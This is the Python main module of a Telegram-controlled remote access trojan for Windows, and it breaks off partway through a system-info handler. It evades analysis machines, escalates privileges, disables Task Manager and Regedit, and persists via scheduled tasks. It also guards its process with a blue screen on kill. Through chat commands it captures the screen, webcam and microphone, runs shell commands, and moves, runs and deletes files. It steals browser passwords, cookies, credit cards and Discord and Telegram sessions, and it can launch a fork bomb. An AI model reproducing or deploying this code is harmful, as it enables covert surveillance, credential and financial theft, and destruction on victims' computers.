import sys,platform
import telebot
import requests
from getmac import get_mac_address as gma
from RAT import *

from Core.Settings.Organization    import *
from Core.Settings.Antivirus       import *
from Core.Settings.Admin           import *
from Core.Settings.CriticalProcess import *
from Core.Settings.MessageBox      import *

from Core.Network.Information      import *
from Core.Network.Location         import *

from Core.Main.Screen              import *
from Core.Main.Webcam              import *
from Core.Main.Audio               import *
from Core.Main.Power               import *
from Core.Main.Autorun             import *

from Core.Files.Tasklist           import *
from Core.Files.Taskkill           import *

from Core.Fun.Message              import *
from Core.Fun.Speak                import *
from Core.Fun.OpenURL              import *
from Core.Fun.Wallpapers           import *
from Core.Fun.ForkBomb             import *

from Core.Stealer.Discord          import *
from Core.Stealer.Stealer          import *
from Core.Stealer.Telegram         import *

from Core.Other.Clipboard          import *
from Core.Other.Monitor            import *
from Core.Other.Rotate             import *
from Core.Other.Freeze             import *

from telebot import types
from telebot import util

bot = telebot.TeleBot(TelegramToken, threaded=True)
bot.worker_pool = util.ThreadPool(num_threads=50)

menu = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/1\n<<')
button2 = types.KeyboardButton('/2\n>>')
button3 = types.KeyboardButton('/Screen\n🖼')
button4 = types.KeyboardButton('/Webcam\n📸')
button5 = types.KeyboardButton('/Audio\n🎙')
button6 = types.KeyboardButton('/Power\n🔴')
button7 = types.KeyboardButton('/Autorun\n🔵')
menu.row(button1, button3, button2)
menu.row(button4, button5)
menu.row(button6, button7)

main2 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Hibernate - 🛑', callback_data='hibernate')
button2 = types.InlineKeyboardButton('Shutdown - ⛔️', callback_data='shutdown')
button3 = types.InlineKeyboardButton('Restart - ⭕️', callback_data='restart')
button4 = types.InlineKeyboardButton('Logoff - 💢', callback_data='logoff')
button5 = types.InlineKeyboardButton('BSoD - 🌀', callback_data='bsod')
button6 = types.InlineKeyboardButton('« Back', callback_data='cancel')
main2.row(button1)
main2.row(button2)
main2.row(button3)
main2.row(button4)
main2.row(button5)
main2.row(button6)

main3 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Add to Startup - 📥', callback_data='startup')
button2 = types.InlineKeyboardButton('Uninstall - ♻️', callback_data='confirm')
button3 = types.InlineKeyboardButton('« Back', callback_data='cancel')
main3.row(button1)
main3.row(button2)
main3.row(button3)

main4 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Yes, im sure!', callback_data='uninstall')
button2 = types.InlineKeyboardButton('Hell no!', callback_data='cancel')
button3 = types.InlineKeyboardButton('« Back', callback_data='cancel')
main4.row(button1)
main4.row(button2)
main4.row(button3)

main5 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/3\n<<')
button2 = types.KeyboardButton('/4\n>>')
button3 = types.KeyboardButton('/Screen\n🖼')
button4 = types.KeyboardButton('/Files\n💾')
button5 = types.KeyboardButton('/Tasklist\n📋')
button6 = types.KeyboardButton('/Taskkill\n📝')
main5.row(button1, button3, button2)
main5.row(button4)
main5.row(button5, button6)

main6 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Kill all Processes', callback_data='taskkill all')
button2 = types.InlineKeyboardButton('Disable Task Manager', callback_data='disabletaskmgr')
main6.row(button1)
main6.row(button2)

main7 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/CD\n🗂')
button2 = types.KeyboardButton('/Upload\n📡')
button3 = types.KeyboardButton('/ls\n📄')
button4 = types.KeyboardButton('/Remove\n🗑')
button5 = types.KeyboardButton('/Download\n📨')
button6 = types.KeyboardButton('/Run\n📌')
button7 = types.KeyboardButton('/Cancel')
main7.row(button1, button2, button3)
main7.row(button4, button5, button6)
main7.row(button7)

main8 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/5\n<<')
button2 = types.KeyboardButton('/6\n>>')
button3 = types.KeyboardButton('/Screen\n🖼')
button4 = types.KeyboardButton('/Message\n💬')
button5 = types.KeyboardButton('/Speak\n📢')
button6 = types.KeyboardButton('/OpenURL\n🌐')
button7 = types.KeyboardButton('/Wallpapers\n🧩')
button8 = types.KeyboardButton('/ForkBomb\n⏱')
main8.row(button1, button3, button2)
main8.row(button4, button5)
main8.row(button6, button7, button8)


# Variables

Expansion = os.path.splitext(os.path.basename(sys.argv[0]))[1]
CurrentName = os.path.basename(sys.argv[0])
CurrentPath = sys.argv[0]
ProcessName = ProcessName + Expansion



# Create a folder to save temporary files

if not os.path.exists(Directory):
 os.makedirs(Directory)
 os.makedirs(Directory + 'Documents')
 os.makedirs(Directory + 'Photos')



# Checks if the script is running  computer of the anti-virus organization

if Organization() is True:
 sys.exit()


# Run as Administrator

if AdminRightsRequired is True:
 if Admin() is False:
  while True:
   try:
    print('[~] › Trying elevate previleges to administrator\n')
    os.startfile(CurrentPath, 'runas')
   except:
    pass
   else:
    print('[+] › ' + CurrentName + ' opened as admin rights\n')
    break


# Checks if the file is running as an administrator

if AdminRightsRequired is True:
 if Admin() is False:
  sys.exit()


# Disables TaskManager

if DisableTaskManager is True:
 try:
  if os.path.exists(Directory + 'RegeditDisableTaskManager'):
   print('[+] › Task Manager is already disabled\n')

  else:
   if Admin() is False:
    print('[-] › This function requires admin rights\n')
   
   if Admin() is True:
    RegeditDisableTaskManager()
    open(Directory + 'RegeditDisableTaskManager', 'a').close()
    print('[+] › Task Manager is was disabled\n')
 except:
  pass


# Disables Regedit

if DisableRegistryTools is True:
 try:
  if os.path.exists(Directory + 'RegeditDisableRegistryTools'):
   print('[+] › Regedit is already disabled\n')

  else:
   if Admin() is False:
    print('[-] › This function requires admin rights\n')

   if Admin() is True:
    RegeditDisableRegistryTools()
    open(Directory + 'RegeditDisableRegistryTools', 'a').close()
    print('[+] › Regedit is was disabled\n')
 except:
  pass


# Adds a program to startup

if AutorunEnabled is True:
 try:
  if SchtasksExists(AutorunName) and InstallPathExists(InstallPath, ProcessName) is True:
   print('[+] › '+ CurrentName +' ‹ is already in startup › ' + InstallPath + '\\' + ProcessName + '\n')

  else:
   if Admin() is False:
    print('[-] › This function requires admin rights!\n')

   if Admin() is True:
    AddToAutorun(AutorunName, InstallPath, ProcessName)

    if not os.path.exists(InstallPath + '\\' + ProcessName):
     CopyToAutorun(CurrentPath, InstallPath, ProcessName)

    print('[+] › ' + CurrentName+' ‹ copied to startup › ' + InstallPath + '\\' + ProcessName + '\n')
 except:
  pass


# Displays a message on the screen.

if DisplayMessageBox is True:
 try: 
  if os.path.exists(Directory + 'DisplayMessageBox'):
   pass

  else:
   open(Directory + 'DisplayMessageBox', 'a').close()
   MessageBox(Message)
 except:
  pass


# Protect process with BSoD (if killed).

if ProcessBSODProtectionEnabled is True:
 if Admin() is False:
  print('[-] › This function requires admin rights\n')

 if Admin() is True:
  SetProtection()
  print('[+] › Process protection is was activated\n')


# Adds argument none_stop if process protection is enabled

if ProcessBSODProtectionEnabled is True:
 Argument = none_stop = True
else:
 Argument = ''


# Sends an online message

while True:
 try:
  if Admin() is True:
   Online = '🔘 Online!'

  if Admin() is False:
   Online = '🟢 Online!'

  bot.send_message(TelegramChatID, 
  '\n*' + Online + '\n'
  '\nPC » ' + ComputerName + '_' + gma() + '_' + os.getlogin() +
  '\nOS » ' + Windows() +
  '\n'
  '\nAV » ' + Antivirus[0] +
  '\n'
  '\nIP » ' + Geolocation('query') + '*',
  parse_mode='Markdown')

 except Exception as e:
  print('[-] › Retrying connect to api.telegram.org\n')
  print(e)
 else:
  print('[+] › Connected to api.telegram.org\n')
  break



# Takes a screenshot

@bot.message_handler(regexp='/Screen')
def Screen(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  File = Directory + 'Screenshot.jpg'

  Screenshot(File)
  Screen = open(File, 'rb')

  bot.send_photo(command.chat.id, Screen)
 except:
  pass


# Takes a photo from a webcam

@bot.message_handler(regexp='/Webcam')
def Webcam(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  File = Directory + 'Webcam.jpg'

  if os.path.exists(File):
    os.remove(File)

  WebcamScreenshot(File)
  Webcam = open(File, 'rb')

  bot.send_photo(command.chat.id, Webcam)
 except:
  bot.reply_to(command, '_Webcam not found!_', parse_mode='Markdown')


# Records microphone sound

@bot.message_handler(regexp='/Audio')
def Audio(command):
 try:
  Seconds = re.split('/Audio ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '_Recording..._', parse_mode='Markdown')
  try:
   File = Directory + 'Audio.wav'

   Microphone(File, Seconds)
   Audio = open(File, 'rb')
   
   bot.send_voice(command.chat.id, Audio)
  except ValueError:
   bot.reply_to(command, '_Specify the recording time in seconds!_', parse_mode='Markdown')
  except:
   bot.reply_to(command, '_Microphone not found!_', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '_Specify the recording duration_\n\n*› /Audio*', parse_mode='Markdown')


# Sends a message

def SendMessage(call, text):
 bot.edit_message_text(chat_id=call.message.chat.id,
 message_id=call.message.message_id, text=text, parse_mode='Markdown')


# Power and startup management

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(command):
 if command.message:


  # Hibernate button

  if command.data == 'hibernate':
   try:
    SendMessage(command, '*Hibernate* _command received!_')
    UnsetProtection()
    Hibernate()
   except:
    pass


  # Shutdown button

  if command.data == 'shutdown':
   try:
    SendMessage(command, '*Shutdown* _command received!_')
    UnsetProtection()
    Shutdown()
   except:
    pass


  # Reboot button

  if command.data == 'restart':
   try:
    SendMessage(command, '*Restart* _command received!_')
    UnsetProtection()
    Restart()
   except:
    pass


  # Button that ends a user session

  if command.data == 'logoff':
   try:
    SendMessage(command, '*Logoff* _command received!_')
    UnsetProtection()
    Logoff()
   except:
    pass


  # Button killing system with blue screen of death

  if command.data == 'bsod':
   try:
    SendMessage(command, '*Blue Screen of Death* _is was activated!_')
    UnsetProtection()
    BSoD()
   except:
    pass


  # Button processing which adds a trojan to startup (schtasks)

  if command.data == 'startup':
   try:
    if SchtasksExists(AutorunName) and InstallPathExists(InstallPath, ProcessName) is True:
     SendMessage(command, '*' + ProcessName + '* _is already in startup!_')

    else:
     if Admin() is False:
      SendMessage(command, '_This function requires admin rights!_')
     
     if Admin() is True:
      AddToAutorun(AutorunName, InstallPath, ProcessName)

      if not os.path.exists(InstallPath + '\\' + ProcessName):
       CopyToAutorun(CurrentPath, InstallPath, ProcessName)

      SendMessage(command, '*' + ProcessName + '* _copied to startup!_')
   except FileNotFoundError:
    SendMessage(command, '_No such file or directory_')
   except:
    pass


  # Button processing that confirms the removal of a trojan

  if command.data == 'confirm':
   bot.edit_message_text(chat_id=command.message.chat.id,
   message_id=command.message.message_id, text='_Are you sure?_', reply_markup=main4, parse_mode='Markdown')


  # Handling the <<Uninstall>> Button

  if command.data == 'uninstall':
   SendMessage(command, '*' + CurrentName + '* _is was uninstalled!_')
   Uninstall(AutorunName, InstallPath, ProcessName, CurrentName, CurrentPath, Directory)


  # Handling the <<Kill All Processes>> Button

  if command.data == 'taskkill all':
   try:
    TaskkillAll(CurrentName)
    SendMessage(command, '_All processes is was stopped!_')
   except:
    pass


  # Handling the <<Disable Task Manager>> Button

  if command.data == 'disabletaskmgr':
   try:
    if os.path.exists(Directory + 'RegeditDisableTaskManager'):
      SendMessage(command, '*Task Manager* _is already disabled!_')

    else:
     if Admin() is False:
      SendMessage(command, '_This function requires admin rights!_')

     if Admin() is True:
      RegeditDisableTaskManager()
      open(Directory + 'RegeditDisableTaskManager', 'a').close()
      SendMessage(command, '*Task Manager* _is was disabled!_')
   except:
    pass


  # Handling the <<Back>> Button

  if command.data == 'cancel':
    SendMessage(command, '`...`')


# Browse and switch directories

@bot.message_handler(regexp='/CD')
def CD(command):
 try:
  Path = re.split('/CD ', command.text, flags=re.I)[1]

  os.chdir(Path)

  bot.send_message(command.chat.id, '_Directory Changed!_\n\n`' + os.getcwd() + '`', parse_mode='Markdown')
 except FileNotFoundError:
  bot.reply_to(command, '_Directory not found!_', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '_Current Directory_\n\n`' + os.getcwd() + '`\n\n_Username_\n\n`' + os.getlogin() + '`', parse_mode='Markdown')


# List of files from a directory

@bot.message_handler(regexp='/ls')
def ls(command):
 try:
  Dirs = '\n``'.join(os.listdir())

  bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n\n' + '`' + Dirs + '`', parse_mode='Markdown')
 except:
  try:
   Dirse = '\n'.join(os.listdir())

   SplittedText = util.split_string(Dirse, 4096)
   for Dirse in SplittedText:

    bot.send_message(command.chat.id, '`' + Dirse + '`', parse_mode='Markdown')
  except PermissionError:
   bot.reply_to(command, '_Permission denied!_', parse_mode='Markdown')
  except:
   pass


# Deletes a user selected file

@bot.message_handler(commands=['Remove', 'remove'])
def Remove(command):
 try:
  File = re.split('/Remove ', command.text, flags=re.I)[1]

  Created = os.path.getctime(os.getcwd() + '\\' + File)
  Year, Month, Day, Hour, Minute, Second=localtime(Created)[:-3]

  def ConvertBytes(num):
   for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
    if num < 1024.0:
     return '%3.1f %s' % (num, x)
    num /= 1024.0

  def FileSize(FilePath):
   if os.path.isfile(FilePath):
    FileInfo = os.stat(FilePath)
    return ConvertBytes(FileInfo.st_size)

  bot.send_message(command.chat.id, 
   '_File_ *' + File + '* _removed!_' 
   '\n' 
   '\n*Created* » `%02d/%02d/%d'%(Day, Month, Year) + '`' +
   '\n*Size* » `' + FileSize(os.getcwd() + '\\' + File) + '`',
   parse_mode='Markdown')

  os.remove(os.getcwd() + '\\' + File)

 except:
  try:
   Created = os.path.getctime(os.getcwd() + '\\' + File)
   Year, Month, Day, Hour, Minute, Second=localtime(Created)[:-3]

   Folder = os.getcwd() + '\\' + File
   FolderSize = 0

   for (Path, Dirs, Files) in os.walk(Folder):
    for iFile in Files:
     FileName = os.path.join(Path, iFile)
     FolderSize += os.path.getsize(FileName)
   Files = Folders = 0

   for _, DirNames, FileNames in os.walk(os.getcwd() + '\\' + File):
    Files += len(FileNames)
    Folders += len(DirNames)

   shutil.rmtree(os.getcwd() + '\\' + File)

   bot.send_message(command.chat.id, 
    '_Folder_ *' + File + '* _removed!_'
    '\n'
    '\n*Created* » `%02d/%02d/%d'%(Day, Month, Year) + '`' +
    '\n*Size* » `%0.1f MB' % (FolderSize/(1024*1024.0)) + '`' +
    '\n*Contained* » `' + '{:,} Files, {:,} Folders'.format(Files, Folders) + '`',
    parse_mode='Markdown')

  except FileNotFoundError:
   bot.reply_to(command, '_File not found!_', parse_mode='Markdown')
  except PermissionError:
   bot.reply_to(command, '_Permission denied!_', parse_mode='Markdown')
  except:
   bot.send_message(command.chat.id, '_Enter a file name_\n\n*› /Remove • /RemoveAll*', parse_mode='Markdown')


# Deletes all files from the directory

@bot.message_handler(commands=['RemoveAll', 'removeall'])
def RemoveAll(command):
 try:
  bot.send_message(command.chat.id, '_Removing files..._', parse_mode='Markdown')

  FolderSize = 0
  for (Path, Dirs, Files) in os.walk(os.getcwd()):
   for File in Files:
    FileNames = os.path.join(Path, File)
    FolderSize += os.path.getsize(FileNames)
  Files = Folders = 0

  for _, DirNames, FileNames in os.walk(os.getcwd()):
   Files += len(FileNames)
   Folders += len(DirNames)
  list = os.listdir(os.getcwd())
  a = len(list)

  for FileNames in os.listdir(os.getcwd()):
   FilePath = os.path.join(os.getcwd(), FileNames)
   try:
    if os.path.isfile(FilePath) or os.path.islink(FilePath):
     os.unlink(FilePath)
    elif os.path.isdir(FilePath):
     shutil.rmtree(FilePath)
   except:
     pass

  list = os.listdir(os.getcwd())
  b = len(list)
  c = (a - b)

  bot.send_message(command.chat.id,
   '_Removed_ *' + str(c) + '* _files out of_ *' + str(a) + '!*'
   '\n'
   '\nSize » `%0.1f MB' % (FolderSize/(1024*1024.0)) + '`' +
   '\nContained » `' + '{:,} Files, {:,} Folders'.format(Files, Folders) + '`',
   parse_mode='Markdown')
 except:
  pass


# Upload a file to a connected computer (URL)

@bot.message_handler(regexp='/Upload')
def Upload(command):
 try:
  URL = re.split('/Upload ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '_Uploading file..._', parse_mode='Markdown')

  r = requests.get(URL, allow_redirects=True)
  File = os.getcwd() + '\\' + os.path.basename(r.URL)
  open(File, 'wb').write(r.content)

  bot.reply_to(command, '_File uploaded to computer!_\n\n`' + File + '`', parse_mode='Markdown')
 except ValueError:
  bot.reply_to(command, '_Insert a direct download link_', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '_Send file or paste URL_\n\n*› /Upload*', parse_mode='Markdown')


# Download a file to a connected computer (Message)

@bot.message_handler(content_types=['document'])
def Document(command):
 try:
  File = bot.get_file(command.document.file_id)
  bot.send_message(command.chat.id, '_Uploading file..._', parse_mode='Markdown')

  DownloadedFile = bot.download_file(File.file_path)
  Source = Directory + File.file_path;
  with open(Source, 'wb') as NewFile:
   NewFile.write(DownloadedFile)
  
  Final = os.getcwd() + '\\' + Source.split(File.file_path)[1] + command.document.file_name
  shutil.move(Source, Final)

  bot.reply_to(command, '_File uploaded to computer!_\n\n`' + Final + '`', parse_mode='Markdown')
 except FileNotFoundError:
  bot.reply_to(command, '_File format is not supported!_', parse_mode='Markdown')
 except OSError:
  bot.reply_to(command, '_Try saving the file in a different directory_', parse_mode='Markdown')
 except:
  bot.reply_to(command, '_You cannot upload a file larger than 20 MB_', parse_mode='Markdown')


# Download the file selected by the user

@bot.message_handler(regexp='/Download')
def Download(command):
 try:
  File = re.split('/Download ', command.text, flags=re.I)[1]
  
  Download = open(os.getcwd() + '\\' + File, 'rb')

  bot.send_message(command.chat.id, '_Sending file..._', parse_mode='Markdown')
  bot.send_document(command.chat.id, Download)
 except FileNotFoundError:
  bot.reply_to(command, '_File not found!_', parse_mode='Markdown')
 except:
  try:
   File = re.split('/Download ', command.text, flags=re.I)[1]
   bot.send_message(command.chat.id, '_Archiving..._', parse_mode='Markdown')

   shutil.make_archive(Directory + File,
                           'zip',
                           os.getcwd() + '\\',
                           File)
   iFile = open(Directory + File + '.zip', 'rb')

   bot.send_message(command.chat.id, '_Sending folder..._', parse_mode='Markdown')
   bot.send_document(command.chat.id, iFile)

   iFile.close()
   os.remove(Directory + File + '.zip')
  except PermissionError:
   bot.reply_to(command, '_Permission denied!_', parse_mode='Markdown')
  except:
   try:

    iFile.close()
    os.remove(Directory + File + '.zip')

    bot.reply_to(command, '_You cannot download a file larger than 50 MB_', parse_mode='Markdown')
   except:
    bot.send_message(command.chat.id, '_Enter a file name_\n\n*› /Download*', parse_mode='Markdown')


# Runs the file selected by the user

@bot.message_handler(commands=['Run', 'run'])
def Run(command):
 try:
  File = re.split('/Run ', command.text, flags=re.I)[1]

  os.startfile(os.getcwd() + '\\' + File)

  bot.reply_to(command, '_File_ *' + File + '* _is running!_', parse_mode='Markdown')
 except FileNotFoundError:
  bot.reply_to(command, '_File not found!_', parse_mode='Markdown')
 except OSError:
  bot.reply_to(command, '_The file is isolated by the system and cannot be running_', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '_Enter a file name_\n\n*› /Run • /RunAS*', parse_mode='Markdown')


# Runs the file selected by the user as administrator

@bot.message_handler(commands=['RunAS', 'runas'])
def RunAS(command):
 try:
  File = re.split('/RunAS ', command.text, flags=re.I)[1]

  os.startfile(os.getcwd() + '\\' + File, 'runas')

  bot.reply_to(command, 'File *' + File + '* is running!', parse_mode='Markdown')
 except FileNotFoundError:
  bot.reply_to(command, '_File not found!_', parse_mode='Markdown')
 except OSError:
  bot.reply_to(command, '_Acces denied!_', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '_Enter a file name_\n\n*› /Run • /RunAS*', parse_mode='Markdown')


# Gets a list of active processes

@bot.message_handler(regexp='/Tasklist')
def Tasklist(command):
 try:
  bot.send_message(command.chat.id, '`' + ProcessList() + '`', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '_Failed to get process list!_', parse_mode='Markdown')


# Kills the user selected process

@bot.message_handler(regexp='/Taskkill')
def Taskkill(command):
 try:
  Process = re.split('/Taskkill ', command.text, flags=re.I)[1]

  KillProcess(Process)

  if not Process.endswith('.exe'):
   Process = Process + '.exe'

  bot.reply_to(command, '_Process_ *' + Process + '* _is was stopped!_', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, 
   '_Enter process name_'
   '\n'
   '\n*› /Taskkill*'
   '\n'
   '\n_Active Window_'
   '\n'
   '\n`' + str(WindowTitle()) + '`',
   reply_markup=main6, parse_mode='Markdown')


# Displays text sent by user

@bot.message_handler(regexp='/Message')
def Message(command):
 try:
  Message = re.split('/Message ', command.text, flags=re.I)[1]

  bot.reply_to(command, '_The message is was sended!_', parse_mode='Markdown')

  SendMessageBox(Message)
 except:
  bot.send_message(command.chat.id, '_Enter your message_\n\n*› /Message*', parse_mode='Markdown')


# Speak text

@bot.message_handler(regexp='/Speak')
def Speak(command):
 try:
  Text = re.split('/Speak ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '_Speaking..._', parse_mode='Markdown')
  try:

   SpeakText(Text)
   bot.reply_to(command, '_Successfully!_', parse_mode='Markdown')

  except:
   bot.reply_to(command, '_Failed to speak text!_', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '_Enter your text_\n\n*› /Speak*', parse_mode='Markdown')


# Opens a link from a standard browser

@bot.message_handler(regexp='/OpenURL')
def OpenURL(command):
 try:
  URL = re.split('/OpenURL ', command.text, flags=re.I)[1]

  OpenBrowser(URL)

  bot.reply_to(command, '_The URL is was opened!_', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '_Enter your URL_\n\n*› /OpenURL*', parse_mode='Markdown')


# Sets the desktop wallpaper

@bot.message_handler(content_types=['photo'])
def Wallpapers(command):
 try:
  Photo = bot.get_file(command.photo[len(command.photo)-1].file_id)

  file_info = bot.get_file(command.photo[len(command.photo)-1].file_id)
  downloaded_file = bot.download_file(file_info.file_path)
  src = Directory + file_info.file_path;
  with open(src, 'wb') as new_file:
    new_file.write(downloaded_file)

  SetWallpapers(Photo, Directory)

  bot.reply_to(command, '_The photo is set on the wallpapers!_', parse_mode='Markdown')
 except:
  pass


# Infinite start CMD.exe

@bot.message_handler(regexp='/Forkbomb')
def Forkbomb(command):
 bot.send_message(command.chat.id, '_Preparing ForkBomb..._', parse_mode='Markdown')
 ForkBomb()


# Gets Discord Token

@bot.message_handler(regexp='/Discord')
def Discord(command):
 try:
  bot.send_message(command.chat.id, '*Discord Token*\n\n`' + DiscordToken() + '`', parse_mode='Markdown')
 except:
  bot.reply_to(command, '_Discord not installed!_', parse_mode='Markdown')


# Gets the user current telegram session

@bot.message_handler(regexp='/Telegram')
def Telegram(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_document')

  TelegramGrab(Directory)
  Telegram = open(Directory + 'tdata.zip', 'rb')

  bot.send_document(command.chat.id, Telegram)
 except:
  bot.reply_to(command, '_Telegram not installed!_', parse_mode='Markdown')


# Retrieves saved passwords from browsers (Opera, Chrome)

@bot.message_handler(regexp='/CreditCards')
def CreditCards(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_document')

  with open(Directory + 'CreditCards.txt', 'w', encoding='utf-8') as f:
   f.writelines(GetFormattedCreditCards())

  CreditCards = open(Directory + 'CreditCards.txt', 'rb')
  bot.send_document(command.chat.id, CreditCards)
 except:
  bot.reply_to(command, '_CreditCards not found!_', parse_mode='Markdown')


# Retrieves saved passwords from browsers (Opera, Chrome)

@bot.message_handler(regexp='/Bookmarks')
def Bookmarks(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_document')

  with open(Directory + 'Bookmarks.txt', 'w', encoding='utf-8') as f:
   f.writelines(GetFormattedBookmarks())

  Bookmarks = open(Directory + 'Bookmarks.txt', 'rb')
  bot.send_document(command.chat.id, Bookmarks)
 except:
  bot.reply_to(command, '_Bookmarks not found!_', parse_mode='Markdown')


# Retrieves saved passwords from browsers (Opera, Chrome)

@bot.message_handler(regexp='/Passwords')
def Passwords(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_document')

  with open(Directory + 'Passwords.txt', 'w', encoding='utf-8') as f:
   f.writelines(GetFormattedPasswords())

  Passwords = open(Directory + 'Passwords.txt', 'rb')
  bot.send_document(command.chat.id, Passwords)
 except:
  bot.reply_to(command, '_Passwords not found!_', parse_mode='Markdown')


# Retrieves saved cookies from browsers (Opera, Chrome)

@bot.message_handler(regexp='/Cookies')
def Cookies(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_document')
  
  with open(Directory + 'Cookies.txt', 'w', encoding='utf-8') as f:
   f.writelines(GetFormattedCookies())
  
  Cookies = open(Directory + 'Cookies.txt', 'rb')
  bot.send_document(command.chat.id, Cookies)
 except:
  bot.reply_to(command, '_Cookies not found!_', parse_mode='Markdown')


# Gets saved browser history (Opera, Chrome)

@bot.message_handler(regexp='/History')
def History(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_document')
  
  with open(Directory + 'History.txt', 'w', encoding='utf-8') as f:
   f.writelines(GetFormattedHistory())
  
  History = open(Directory + 'History.txt', 'rb')
  bot.send_document(command.chat.id, History)
 except:
  bot.reply_to(command, '_History not found!_', parse_mode='Markdown')


# Editing and viewing the clipboard

@bot.message_handler(regexp='/Clipboard')
def Clipboard(command):
 try:
  Text = re.split('/Clipboard ', command.text, flags=re.I)[1]

  SetClipboard(Text)

  bot.reply_to(command, '_Clipboard contents changed!_', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id,
   '_Enter your text_'
   '\n'
   '\n*› /Clipboard*'
   '\n'
   '\n_Clipboard Content_'
   '\n'
   '\n`' + GetClipboard() + '`',
   parse_mode='Markdown')


# Display Rotate <0,90,180,270>

@bot.message_handler(regexp='/Rotate')
def Rotate(command):
 try:
  Position = re.split('/Rotate ', command.text, flags=re.I)[1]

  DisplayRotate(Degrees=Position)

  bot.reply_to(command, '_Display is was rotated!_', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id,
   '_Select display rotation_'
   '\n'
   '\n*› /Rotate*'
   '\n'
   '\n_Provisions_'
   '\n'
   '\n`0` / `90` / `180` / `270`',
   parse_mode='Markdown')


# Monitor <on/off>

@bot.message_handler(regexp='/Monitor')
def Monitor(command):
 try:
  Monitor = re.split('/Monitor ', command.text, flags=re.I)[1]

  if Monitor.lower() == 'Off'.lower():
   Off()
   bot.reply_to(command, '_Monitor is was Off_', parse_mode='Markdown')
  
  if Monitor.lower() == 'On'.lower():
   On()
   bot.reply_to(command, '_Monitor is was On_', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, 
   '_Select monitor mode_'
   '\n'
   '\n*› /Monitor*'
   '\n'
   '\n_Modes_'
   '\n'
   '\n`On` / `Off`',
   parse_mode='Markdown')

# Lock input (keyboard and mouse) for the selected number of seconds


@bot.message_handler(regexp='/Freeze')
def Freeze(command):
 if Admin() is False:
  bot.send_message(command.chat.id, '_This function requires admin rights!_', parse_mode='Markdown')
 
 if Admin() is True:
  try:
   Seconds = re.split('/Freeze ', command.text, flags=re.I)[1]
   bot.send_message(command.chat.id, '_Keyboard and mouse locked for_ *' + Seconds + '* _seconds!_', parse_mode='Markdown')
   
   Block(float(Seconds))
   
   bot.reply_to(command, '_Keyboard and mouse are now unlocked!_', parse_mode='Markdown')
  except ValueError:
   bot.reply_to(command, '_Specify the duration of the lock in seconds_', parse_mode='Markdown')
  except:
   bot.send_message(command.chat.id, '_Specify the duration of the lock_\n\n*› /Freeze*', parse_mode='Markdown')


# Remote command execution (CMD)

@bot.message_handler(regexp='/CMD')
def CMD(command):
 try:
  Command = re.split('/CMD ', command.text, flags=re.I)[1]
  CMD = Popen(Command, shell=True, stdout=PIPE, stderr=STDOUT, stdin=PIPE)
  
  Lines = []
  for Line in CMD.stdout.readlines():
   Line = Line.strip()
   if Line:
    Lines.append(Line.decode('cp866'))
    Output = '\n'.join(Lines)
  
  bot.send_message(command.chat.id, Output)
 except:
  try:
   Command = re.split('/CMD ', command.text, flags=re.I)[1]
   
   SplittedText = util.split_string(Output, 4096)
   for Output in SplittedText:

    bot.send_message(command.chat.id, Output)
  except UnboundLocalError:
   bot.reply_to(command, '_Command completed!_', parse_mode='Markdown')
  except:
   bot.send_message(command.chat.id, '_Enter your command_\n\n*› /CMD*', parse_mode='Markdown')


# Getting location by BSSID

@bot.message_handler(regexp='/Location')
def Location(command):
 try:
  bot.send_chat_action(command.chat.id, 'find_location')
  Coordinates = GetLocationByBSSID(GetMacByIP())
  Latitude = Coordinates['lat']
  Longitude = Coordinates['lon']
  bot.send_location(command.chat.id, Latitude, Longitude)
  bot.send_message(command.chat.id,
   '_Location_'
   '\n'
   '\n*IP Address* » `' + Geolocation('query') + '`' +
   '\n*Country* » `' + Geolocation('country') + '`' +
   '\n*City* » `' + Geolocation('city') + '`' +
   '\n'
   '\n*Latitude* » `' + str(Coordinates['lat']) + '`' +
   '\n*Longitude* » `' + str(Coordinates['lon']) + '`' +
   '\n*Range* » `' + str(Coordinates['range']) + '`' +
   '\n'
   '\n*BSSID* » `' + GetMacByIP() + '`' +
   '\n',
   parse_mode='Markdown') 
 except:
  bot.send_message(command.chat.id,
   '_Failed locate target by BSSID_'
   '\n'
   '\n*IP Address* » `' + Geolocation('query') + '`' +
   '\n*Country* » `' + Geolocation('country') + '`' +
   '\n*City* » `' + Geolocation('city') + '`' +
   '\n'
   '\n*BSSID* » `' + GetMacByIP() + '`' +
   '\n',
   parse_mode='Markdown') 


# System Information

@bot.message_handler(regexp='/Info')
def Info(command):
 try:
  bot.send_message(command.chat.id, 
   '\n_Computer Info_'
   '\n'
   '\n*System* » `' + SystemVersion + '`' +
   '\n*Computer Name* » `' + ComputerName + '`' +
   '\n*Computer Model* » `' + Manufacturer + '`' +
